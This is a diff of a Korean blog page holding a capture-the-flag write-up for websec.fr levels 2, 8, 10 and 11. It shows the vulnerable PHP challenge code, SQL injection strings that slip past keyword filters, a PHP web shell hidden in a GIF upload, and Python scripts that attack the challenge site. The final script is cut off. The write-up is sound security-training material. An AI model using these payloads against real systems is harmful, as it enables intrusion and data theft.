@@ -295,9 +295,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post dock' style="display: none;">
+        <div id="full" class='cover-wrapper post focus' style="display: none;">
           
-            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"></div>
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
           <div class='cover-body'>
   <div class='top'>
@@ -347,7 +347,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
 <div class='new-meta-item author'>
   <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="">
+    <img no-lazy src="/img/header/cat.jpeg">
     <p>jhyeon</p>
   </a>
 </div>
@@ -370,7 +370,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>May 14, 2020</p>
+    <p>Date : May 14, 2020</p>
   </a>
 </div>
 
@@ -378,6 +378,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="websec.fr easy Write up" data-path="/2020/05/14/webseceasy-200514/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        View
+      </div>
+    </a>
+  </div>
+
 
           
         
@@ -388,69 +399,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h3 id="1-LEVEL-2"><a href="#1-LEVEL-2" class="headerlink" title="1. LEVEL 2"></a>1. LEVEL 2</h3><pre><code class="php">class LevelTwo &#123;
-    public function doQuery($injection) &#123;
-        $pdo = new SQLite3(&#39;leveltwo.db&#39;, SQLITE3_OPEN_READONLY);
-
-        $searchWords = implode ([&#39;union&#39;, &#39;order&#39;, &#39;select&#39;, &#39;from&#39;, &#39;group&#39;, &#39;by&#39;], &#39;|&#39;);
-        $injection = preg_replace (&#39;/&#39; . $searchWords . &#39;/i&#39;, &#39;&#39;, $injection);
-
-        $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;;
-        $getUsers = $pdo-&gt;query ($query);
-        $users = $getUsers-&gt;fetchArray (SQLITE3_ASSOC);
-
-        if ($users) &#123;
-            return $users;
-        &#125;
-
-        return false;
-    &#125;
-&#125;</code></pre>
+  <h3 id="1-LEVEL-2"><a href="#1-LEVEL-2" class="headerlink" title="1. LEVEL 2"></a>1. LEVEL 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LevelTwo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doQuery</span>(<span class="hljs-params"><span class="hljs-variable">$injection</span></span>) </span>&#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> SQLite3(<span class="hljs-string">&#x27;leveltwo.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br><br>        <span class="hljs-variable">$searchWords</span> = implode ([<span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;group&#x27;</span>, <span class="hljs-string">&#x27;by&#x27;</span>], <span class="hljs-string">&#x27;|&#x27;</span>);<br>        <span class="hljs-variable">$injection</span> = preg_replace (<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$searchWords</span> . <span class="hljs-string">&#x27;/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$injection</span>);<br><br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="hljs-variable">$injection</span> . <span class="hljs-string">&#x27; LIMIT 1&#x27;</span>;<br>        <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;query (<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;fetchArray (SQLITE3_ASSOC);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$users</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>음 이전에 babystep 단계에서 풀었던 문제와 비슷한 수준입니다.</p>
 <p>조금 달라진 것이 있다면 입력값 필터링(union, order, select) 등을 필터링 합니다.</p>
 <p>근데 정규식(match)가 아닌 replace 방식이기 때문에 ununionion 과 같이 사용한다면 이를 우회할 수 있습니다.</p>
 <p>table structure -&gt; 1 ununionion seselectlect 1,sql frfromom sqlite_master– -</p>
 <p>password -&gt; 1 ununionion seselectlect id,password frfromom users where id=1– -</p>
 <hr>
-<h3 id="2-LEVEL-8"><a href="#2-LEVEL-8" class="headerlink" title="2. LEVEL 8"></a>2. LEVEL 8</h3><pre><code class="php">&lt;?php
-$uploadedFile = sprintf(&#39;%1$s/%2$s&#39;, &#39;/uploads&#39;, sha1($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;.gif&#39;);
-
-if (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125;
-
-if ($_FILES[&#39;fileToUpload&#39;][&#39;size&#39;] &lt;= 50000) &#123;
-    if (getimagesize ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) !== false) &#123;
-        if (exif_imagetype($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) === IMAGETYPE_GIF) &#123;
-            move_uploaded_file ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;], $uploadedFile);
-            echo &#39;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#39; . $uploadedFile . &#39;&quot;&gt;&#39;. htmlentities($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;&lt;/a&gt;:&lt;/p&gt;&#39;;
-            echo &#39;&lt;pre&gt;&#39;;
-            include_once($uploadedFile);
-            echo &#39;&lt;/pre&gt;&#39;;
-            unlink($uploadedFile);
-            &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#39;; &#125;
-         &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#39;; &#125;
-    &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#39;; &#125;
-?&gt;</code></pre>
+<h3 id="2-LEVEL-8"><a href="#2-LEVEL-8" class="headerlink" title="2. LEVEL 8"></a>2. LEVEL 8</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$uploadedFile</span> = sprintf(<span class="hljs-string">&#x27;%1$s/%2$s&#x27;</span>, <span class="hljs-string">&#x27;/uploads&#x27;</span>, sha1(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) . <span class="hljs-string">&#x27;.gif&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (file_exists (<span class="hljs-variable">$uploadedFile</span>)) &#123; unlink (<span class="hljs-variable">$uploadedFile</span>); &#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &lt;= <span class="hljs-number">50000</span>) &#123;<br>    <span class="hljs-keyword">if</span> (getimagesize (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">if</span> (exif_imagetype(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) === IMAGETYPE_GIF) &#123;<br>            move_uploaded_file (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadedFile</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#x27;</span> . <span class="hljs-variable">$uploadedFile</span> . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>. htmlentities(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;fileToUpload&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) . <span class="hljs-string">&#x27;&lt;/a&gt;:&lt;/p&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>            <span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$uploadedFile</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>            unlink(<span class="hljs-variable">$uploadedFile</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#x27;</span>; &#125;<br>         &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#x27;</span>; &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#x27;</span>; &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>파일 업로드 취약점 문제이다. gif 확장자의 사진 파일만 업로드할 수 있도록 해놨지만</p>
 <p>사진 파일 안에 php 코드를 넣어서 웹 쉘을 사용할 수 있다.</p>
 <p>다만 시스템 함수 사용이 안되기 때문에 scandir 함수를 통해 디렉토리 목록을 읽고 플래그 파일을 읽으면 된다.</p>
-<pre><code class="php">&lt;?php print_r(scandir(&quot;./&quot;)); ?&gt;
-&lt;?php show_source(&quot;flag.txt&quot;); ?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> print_r(scandir(<span class="hljs-string">&quot;./&quot;</span>)); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> show_source(<span class="hljs-string">&quot;flag.txt&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="3-LEVEL-10"><a href="#3-LEVEL-10" class="headerlink" title="3. LEVEL 10"></a>3. LEVEL 10</h3><pre><code class="php">&lt;?php
-if (isset ($_REQUEST[&#39;f&#39;]) &amp;&amp; isset ($_REQUEST[&#39;hash&#39;])) &#123;
-    $file = $_REQUEST[&#39;f&#39;];
-    $request = $_REQUEST[&#39;hash&#39;];
-
-    $hash = substr (md5 ($flag . $file . $flag), 0, 8);
-    echo &#39;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#39;;
-    if ($request == $hash) &#123;
-        show_source ($file);
-        &#125; else &#123;
-            echo &#39;Permission denied!&#39;;
-        &#125;
-            echo &#39;&lt;/pre&gt;&lt;/div&gt;&#39;;
-    &#125;
- ?&gt;</code></pre>
+<h3 id="3-LEVEL-10"><a href="#3-LEVEL-10" class="headerlink" title="3. LEVEL 10"></a>3. LEVEL 10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hash&#x27;</span>];<br>    <br>    <span class="hljs-variable">$hash</span> = substr (md5 (<span class="hljs-variable">$flag</span> . <span class="hljs-variable">$file</span> . <span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span> == <span class="hljs-variable">$hash</span>) &#123;<br>        show_source (<span class="hljs-variable">$file</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Permission denied!&#x27;</span>;<br>        &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p> $file 변수에는 특정 파일명 를 넣고 $request 변수에는 hash 값을 입력하게 되는데,</p>
 <p>이 입력한 hash에 대해 $request == $hash 와 같이 $hash 변수에 정의된 값이랑 비교하게 된다.</p>
 <p>이후 두 해쉬값이 동일하면 show_source 함수를 통해 $file에 정의된 파일의 소스코드를 보여준다.</p>
@@ -459,205 +421,31 @@ if (isset ($_REQUEST[&#39;f&#39;]) &amp;&amp; isset ($_REQUEST[&#39;hash&#39;]))
 <ul>
 <li>자료 : <a target="_blank" rel="noopener" href="https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison">https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison</a></li>
 </ul>
-<pre><code class="py">#!/usr/bin/python
-import requests
-
-def run():
-    url = &quot;https://websec.fr/level10/index.php&quot;
-    f = &quot;flag.php&quot;
-    for i in range(870,1000):
-        param = &#123;&quot;f&quot;:f, &quot;hash&quot;:0&#125;
-        r = requests.post(url, data=param)
-
-        if(&quot;Permission denied!&quot; not in r.text):
-            print(r.text)
-            break
-        else:
-            print &quot;sending payload..&quot; +str(i)
-
-        f = &#39;.&#39; + &#39;/&#39; * i + &#39;flag.php&#39;
-
-if __name__ == &#39;__main__&#39;:
-    run()</code></pre>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    url = <span class="hljs-string">&quot;https://websec.fr/level10/index.php&quot;</span><br>    f = <span class="hljs-string">&quot;flag.php&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">870</span>,<span class="hljs-number">1000</span>):<br>        param = &#123;<span class="hljs-string">&quot;f&quot;</span>:f, <span class="hljs-string">&quot;hash&quot;</span>:<span class="hljs-number">0</span>&#125;<br>        r = requests.post(url, data=param)<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;Permission denied!&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text):<br>            print(r.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;sending payload..&quot;</span> +<span class="hljs-built_in">str</span>(i)<br><br>        f = <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span> * i + <span class="hljs-string">&#x27;flag.php&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run()<br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="4-LEVEL-11"><a href="#4-LEVEL-11" class="headerlink" title="4. LEVEL 11"></a>4. LEVEL 11</h3><pre><code class="php">&lt;?php
-ini_set(&#39;display_errors&#39;, &#39;on&#39;);
-ini_set(&#39;error_reporting&#39;, E_ALL);
-
-function sanitize($id, $table) &#123;
-    /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */
-    if (! is_numeric ($id) or $id &lt; 2) &#123;
-        exit(&quot;The id must be numeric, and superior to one.&quot;);
-    &#125;
-
-    /* Rock-solid too! */
-    $special1 = [&quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;-&quot;];
-    $special2 = [&quot;.&quot;, &quot;/&quot;, &quot;:&quot;, &quot;;&quot;, &quot;&lt;&quot;, &quot;=&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;@&quot;, &quot;[&quot;, &quot;\\&quot;, &quot;]&quot;];
-    $special3 = [&quot;^&quot;, &quot;_&quot;, &quot;`&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;];
-    $sql = [&quot;union&quot;, &quot;0&quot;, &quot;join&quot;, &quot;as&quot;];
-    $blacklist = array_merge ($special1, $special2, $special3, $sql);
-    foreach ($blacklist as $value) &#123;
-        if (stripos($table, $value) !== false)
-            exit(&quot;Presence of &#39;&quot; . $value . &quot;&#39; detected: abort, abort, abort!\n&quot;);
-    &#125;
-&#125;
-
-if (isset ($_POST[&#39;submit&#39;]) &amp;&amp; isset ($_POST[&#39;user_id&#39;]) &amp;&amp; isset ($_POST[&#39;table&#39;])) &#123;
-    $id = $_POST[&#39;user_id&#39;];
-    $table = $_POST[&#39;table&#39;];
-
-    sanitize($id, $table);
-
-    $pdo = new SQLite3(&#39;database.db&#39;, SQLITE3_OPEN_READONLY);
-    $query = &#39;SELECT id,username FROM &#39; . $table . &#39; WHERE id = &#39; . $id;
-    //$query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id;
-
-    $getUsers = $pdo-&gt;query($query);
-    $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC);
-
-    $userDetails = false;
-    if ($users) &#123;
-        $userDetails = $users;
-    $userDetails[&#39;table&#39;] = htmlentities($table);
-    &#125;
-&#125;
-?&gt;</code></pre>
+<h3 id="4-LEVEL-11"><a href="#4-LEVEL-11" class="headerlink" title="4. LEVEL 11"></a>4. LEVEL 11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;error_reporting&#x27;</span>, E_ALL);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>, <span class="hljs-variable">$table</span></span>) </span>&#123;<br>    <span class="hljs-comment">/* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */</span><br>    <span class="hljs-keyword">if</span> (! is_numeric (<span class="hljs-variable">$id</span>) <span class="hljs-keyword">or</span> <span class="hljs-variable">$id</span> &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;The id must be numeric, and superior to one.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Rock-solid too! */</span><br>    <span class="hljs-variable">$special1</span> = [<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>];<br>    <span class="hljs-variable">$special2</span> = [<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>];<br>    <span class="hljs-variable">$special3</span> = [<span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>];<br>    <span class="hljs-variable">$sql</span> = [<span class="hljs-string">&quot;union&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;as&quot;</span>];<br>    <span class="hljs-variable">$blacklist</span> = array_merge (<span class="hljs-variable">$special1</span>, <span class="hljs-variable">$special2</span>, <span class="hljs-variable">$special3</span>, <span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$value</span>) !== <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Presence of &#x27;&quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;&#x27; detected: abort, abort, abort!\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;table&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>    <span class="hljs-variable">$table</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;table&#x27;</span>];<br><br>    sanitize(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$table</span>);<br><br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> SQLite3(<span class="hljs-string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM &#x27;</span> . <span class="hljs-variable">$table</span> . <span class="hljs-string">&#x27; WHERE id = &#x27;</span> . <span class="hljs-variable">$id</span>;<br>    <span class="hljs-comment">//$query = &#x27;SELECT id,username,enemy FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id;</span><br><br>    <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;query(<span class="hljs-variable">$query</span>);<br>    <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;fetchArray(SQLITE3_ASSOC);<br><br>    <span class="hljs-variable">$userDetails</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>        <span class="hljs-variable">$userDetails</span> = <span class="hljs-variable">$users</span>;<br>    <span class="hljs-variable">$userDetails</span>[<span class="hljs-string">&#x27;table&#x27;</span>] = htmlentities(<span class="hljs-variable">$table</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>sqlite injection 문제이다. 입력할 수 있는 부분은 <code> user_id, table </code></p>
 <p>두 가지가 있는데 user_id 부분에는 아래와 같이 is_numberic 함수로 숫자만 입력할 수 있도록 필터링 한다.</p>
-<pre><code class="php">if (! is_numeric ($id) or $id &lt; 2) &#123;
-    exit(&quot;The id must be numeric, and superior to one.&quot;);
-&#125;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (! is_numeric (<span class="hljs-variable">$id</span>) <span class="hljs-keyword">or</span> <span class="hljs-variable">$id</span> &lt; <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;The id must be numeric, and superior to one.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>때문에 table 부분에 payload를 작성하고 데이터를 보낼 것이다.</p>
 <p>여기서도 보고가야할 점은 union,join 이외에 여러가지 특수 문자들을 필터링 하고 있어서</p>
 <p>as가 없어도 alias를 사용할 수 있기 때문에 이것을 우회할 수 있다.</p>
-<pre><code class="sql">$query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id;</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$query <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SELECT id,username,enemy FROM &#x27;</span> . $<span class="hljs-keyword">table</span> . <span class="hljs-string">&#x27; WHERE id = &#x27;</span> . $id;<br></code></pre></td></tr></table></figure>
 <p>이제 쿼리문을 맞춰주기만 하면 되는데 코드 내에 이렇게 답을 다 주는 수준이라서 그냥 뽑아내기만 하면 된다.</p>
-<pre><code class="py">#!/usr/bin/python3
-
-import requests
-
-def submit():
-    url = &#39;https://websec.fr/level11/index.php&#39;
-    param = &#123;&#39;user_id&#39;:&#39;2&#39;,&#39;table&#39;:&#39;(select 2 id,enemy username from costume)&#39;,&#39;submit&#39;:&#39;submit&#39;&#125;
